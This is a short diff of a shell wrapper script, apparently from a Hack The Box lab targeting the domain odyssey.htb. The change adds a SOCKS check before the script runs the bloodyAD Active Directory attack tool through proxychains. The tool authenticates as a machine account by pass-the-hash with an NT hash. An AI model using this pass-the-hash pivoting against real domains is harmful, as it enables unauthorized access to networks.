@@ -22,6 +22,7 @@ fi
   exit 1
 }
 
+require_socks
 exec proxychains4 -q "$bloodyad_bin" -s \
   -d odyssey.htb -u 'ODYSSEY-DB$' \
   -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" \
